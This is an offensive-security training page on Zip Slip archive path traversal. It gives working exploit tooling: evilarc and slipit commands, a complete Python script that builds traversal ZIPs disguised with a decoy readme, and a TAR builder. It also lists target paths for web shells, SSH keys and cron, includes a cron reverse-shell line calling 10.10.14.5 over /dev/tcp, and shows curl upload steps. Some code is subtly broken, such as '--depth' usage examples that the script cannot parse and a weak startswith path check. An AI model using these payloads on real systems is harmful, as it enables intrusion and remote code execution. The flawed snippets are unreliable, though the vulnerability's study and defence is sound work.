---
layout: training-page
title: "Zip Slip — Red Team Academy"
module: "Web Hacking"
tags:
  - zip-slip
  - path-traversal
  - file-upload
  - rce
page_key: "web-zip-slip"
render_with_liquid: false
---

# Zip Slip

Zip Slip is a critical vulnerability in archive extraction logic. By crafting an archive containing files with directory traversal sequences in their paths (e.g., `../../shell.php`), an attacker can write files outside the intended extraction directory — overwriting executable files, web shells into document roots, or modifying system files. The vulnerability affects applications that extract archives without sanitizing the file paths inside them.

## Tools

- **evilarc** — Creates tar/zip archives with directory traversal paths — `github.com/ptoomey3/evilarc`
- **slipit** — Utility for creating ZipSlip archives — `github.com/usdAG/slipit`

## Affected Archive Formats

Zip Slip affects multiple archive formats:

- ZIP
- TAR / TAR.GZ / TAR.BZ2
- JAR / WAR (Java)
- CPIO
- APK (Android)
- RAR
- 7Z

## How It Works

A vulnerable extraction routine iterates over archive entries and writes each file to the destination directory by joining the destination path with the entry name. If entry names are not sanitized, a path like `../../../../etc/passwd` resolves outside the intended directory.

Example malicious archive structure:

```
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
  └── normal_file.txt
```

When a vulnerable application extracts this archive, the first two files are written to `/etc/passwd` and `/usr/local/bin/malicious_script.sh` rather than being contained in the extraction directory.

## Creating a Malicious Archive

### Using evilarc

Create a ZIP archive that places a PHP web shell in the web root, traversing up 15 directories:

```
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

Parameters:

- `-o unix` — use Unix path separators
- `-f shell.zip` — output filename
- `-p var/www/html/` — target path relative to traversal root
- `-d 15` — depth of traversal (number of `../` sequences)

### Using Symlinks in ZIP

An alternative approach uses a symbolic link inside the archive. When extracted, the symlink points outside the extraction directory, and subsequent reads/writes follow the link:

```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

## Vulnerable Code Patterns

The following Python pattern is vulnerable — it uses `os.path.join` but does not check whether the result stays within the destination directory:

```
# Vulnerable extraction (Python)
import zipfile, os

def extract(zip_path, dest):
    with zipfile.ZipFile(zip_path) as zf:
        for entry in zf.namelist():
            target = os.path.join(dest, entry)  # NOT safe
            zf.extract(entry, target)

# Safe extraction — validate each path
def safe_extract(zip_path, dest):
    with zipfile.ZipFile(zip_path) as zf:
        for entry in zf.namelist():
            target = os.path.realpath(os.path.join(dest, entry))
            if not target.startswith(os.path.realpath(dest)):
                raise Exception("Zip Slip detected: " + entry)
            zf.extract(entry, dest)
```

## Impact

- Write web shells into the document root for remote code execution
- Overwrite server-side scripts or binaries executed by scheduled tasks
- Overwrite configuration files (e.g., SSH authorized_keys, sudoers)
- Corrupt application files to cause denial of service

---

## Path Traversal Mechanics in Archive Formats

Each archive format stores filenames differently, but the traversal concept is identical — the entry name contains `../` sequences that are not stripped during extraction:

### ZIP

ZIP stores filenames in central directory and local file headers. Most ZIP parsers pass the entry name directly to the filesystem write routine. Traversal entry names look like:

```
../../../../etc/cron.d/evil
../../var/www/html/webshell.php
../config/database.yml
```

### TAR

TAR archives store filenames in the header of each entry block. GNU tar and some libraries do not strip leading `../` sequences. Example TAR entries:

```
../../../../home/user/.ssh/authorized_keys
../../web/WEB-INF/web.xml
```

Creating a malicious TAR manually:

```python
import tarfile, os

def make_malicious_tar(output_path, payload_path, target_path):
    with tarfile.open(output_path, 'w:gz') as tar:
        info = tarfile.TarInfo(name=target_path)
        info.size = os.path.getsize(payload_path)
        with open(payload_path, 'rb') as f:
            tar.addfile(info, f)

# Write shell.php to ../../var/www/html/shell.php relative to extraction dir
make_malicious_tar('evil.tar.gz', 'shell.php', '../../var/www/html/shell.php')
```

### JAR / WAR (Java)

Java application servers extract WAR files during deployment. A malicious WAR with traversal entries overwrites JSP files, configuration files, or Java class files in other deployed applications:

```
WEB-INF/lib/../../../../../../etc/passwd
../../../host-manager/index.jsp
```

### CPIO

Used in RPM packages and some Linux archive formats. CPIO does not strip `../` sequences in vulnerable implementations.

---

## Python Script to Create Malicious ZIP

Full standalone Python script for creating a traversal ZIP:

```python
#!/usr/bin/env python3
"""
Create a Zip Slip malicious archive for testing purposes.
Usage: python3 make_zipslip.py <payload_file> <target_path> <output.zip>
Example: python3 make_zipslip.py shell.php ../../var/www/html/shell.php evil.zip
"""
import zipfile
import sys
import os

def create_zipslip(payload_file, target_path, output_zip, depth=None):
    """
    Create a ZIP with a traversal path entry.
    If depth is set, auto-generate ../../../ prefix of that depth.
    """
    if depth:
        prefix = '../' * depth
        entry_name = prefix + target_path
    else:
        entry_name = target_path

    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add a benign file to look legitimate
        zf.writestr('readme.txt', 'This archive contains documentation.\n')
        # Add the malicious entry
        zf.write(payload_file, entry_name)
        print(f"[+] Created {output_zip}")
        print(f"[+] Malicious entry: {entry_name}")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <payload_file> <target_path> <output.zip> [depth]")
        sys.exit(1)
    depth = int(sys.argv[4]) if len(sys.argv) > 4 else None
    create_zipslip(sys.argv[1], sys.argv[2], sys.argv[3], depth)
```

Usage examples:

```
# Place PHP web shell at ../../var/www/html/shell.php
python3 make_zipslip.py shell.php var/www/html/shell.php evil.zip --depth 2

# Overwrite SSH authorized_keys
python3 make_zipslip.py authorized_keys .ssh/authorized_keys evil.zip --depth 5

# Overwrite cron job
python3 make_zipslip.py cronjob etc/cron.d/evil evil.zip --depth 8
```

### evilarc — Common Examples

```
# Web shell to Apache document root (Linux)
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 10

# Web shell to Nginx document root
python evilarc.py shell.php -o unix -f shell.zip -p usr/share/nginx/html/ -d 10

# Overwrite SSH authorized_keys
python evilarc.py authorized_keys -o unix -f evil.zip -p home/www-data/.ssh/ -d 8

# Windows IIS web root
python evilarc.py shell.aspx -o win -f shell.zip -p inetpub/wwwroot/ -d 5
```

### slipit

```
# Create a ZIP with a path traversal entry
slipit create -f evil.zip -e "../../var/www/html/shell.php=shell.php"

# List entries in an existing archive to verify
slipit list evil.zip
```

---

## Exploitation Targets

### Web Shell Deployment

The most common impact — write a web shell to the document root for RCE:

```
# Target path for common web servers
../../var/www/html/shell.php         # Apache/Nginx on Ubuntu/Debian
../../srv/www/htdocs/shell.php       # Apache on SUSE
../../opt/bitnami/apache/htdocs/     # Bitnami stacks
../../usr/local/www/apache24/data/   # FreeBSD Apache
../../inetpub/wwwroot/shell.aspx     # IIS on Windows
```

### Cron Job Execution

Place a script in a cron directory for scheduled execution:

```
../../etc/cron.d/backdoor
../../etc/cron.hourly/evil.sh
```

Contents of the cron entry:

```
* * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### SSH Authorized Keys

Write an attacker-controlled SSH public key:

```
../../home/www-data/.ssh/authorized_keys
../../root/.ssh/authorized_keys
```

### Startup Scripts

```
../../etc/init.d/evil
../../etc/rc.local
../../etc/profile.d/evil.sh
```

---

## Language-Specific Vulnerable Functions

### Java — ZipInputStream

The classic vulnerable Java extraction pattern:

```java
// Vulnerable Java extraction
ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile));
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    File outFile = new File(destDir, entry.getName()); // NO validation
    FileOutputStream fos = new FileOutputStream(outFile);
    // ... write file
}

// Safe Java extraction — check canonical path
while ((entry = zis.getNextEntry()) != null) {
    File outFile = new File(destDir, entry.getName());
    String canonicalPath = outFile.getCanonicalPath();
    if (!canonicalPath.startsWith(new File(destDir).getCanonicalPath() + File.separator)) {
        throw new IOException("Zip Slip attempt: " + entry.getName());
    }
    // ... write file
}
```

### Python — zipfile module

```python
# Vulnerable
import zipfile
zf = zipfile.ZipFile('evil.zip')
zf.extractall('/tmp/uploads/')  # extractall() is actually safe in Python 3.12+

# Older Python versions — manual extraction is vulnerable
for name in zf.namelist():
    zf.extract(name, '/tmp/uploads/')  # Does NOT check path traversal in all versions
```

Note: Python's `zipfile.extractall()` was patched in Python 3.12 to strip leading `../` sequences. Older versions require manual path validation.

### Node.js — adm-zip

```javascript
// Vulnerable Node.js with adm-zip
const AdmZip = require('adm-zip');
const zip = new AdmZip('evil.zip');
zip.extractAllTo('/tmp/uploads/', true);  // Vulnerable in old versions of adm-zip

// Safe — check each entry
zip.getEntries().forEach(entry => {
    const entryPath = path.resolve('/tmp/uploads/', entry.entryName);
    if (!entryPath.startsWith(path.resolve('/tmp/uploads/'))) {
        throw new Error('Zip Slip: ' + entry.entryName);
    }
});
```

### Ruby — rubyzip

```ruby
# Vulnerable Ruby extraction
Zip::File.open('evil.zip') do |zip_file|
  zip_file.each do |entry|
    entry.extract(entry.name)  # Vulnerable — no path check
  end
end
```

---

## Identifying Vulnerable Endpoints

When testing a web application, look for:

1. **File upload endpoints that accept archives**: Look for `multipart/form-data` upload forms or API endpoints that accept `.zip`, `.tar.gz`, `.jar`, `.war` files.
2. **Import/backup restore functionality**: Applications that accept ZIP or TAR archives to restore data.
3. **Plugin/extension upload features**: CMS or framework plugin installers that extract ZIP archives.
4. **Firmware update mechanisms**: IoT devices or embedded systems that accept firmware ZIPs.

Testing steps:

```
# 1. Create a test archive with a benign traversal (write to /tmp)
python evilarc.py test.txt -o unix -f test.zip -p tmp/zipslip-test.txt -d 8

# 2. Upload the archive
curl -X POST https://target.com/upload \
  -F "file=@test.zip" \
  -H "Cookie: session=..."

# 3. Check if the file was written outside the intended directory
curl https://target.com/check-for-file  # or look for indicators in the response
```

---

## Resources

- evilarc — `github.com/ptoomey3/evilarc`
- slipit — `github.com/usdAG/slipit`
- Zip Slip Vulnerability — Snyk Research — `github.com/snyk/zip-slip-vulnerability`
- Affected libraries list — `github.com/snyk/zip-slip-vulnerability`
- OWASP Path Traversal — `owasp.org/www-community/attacks/Path_Traversal`
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory — `cwe.mitre.org/data/definitions/22.html`
- Zip Slip — All You Need to Know — Res260 — `res260.com/blog/2018/06/zip-slip/`
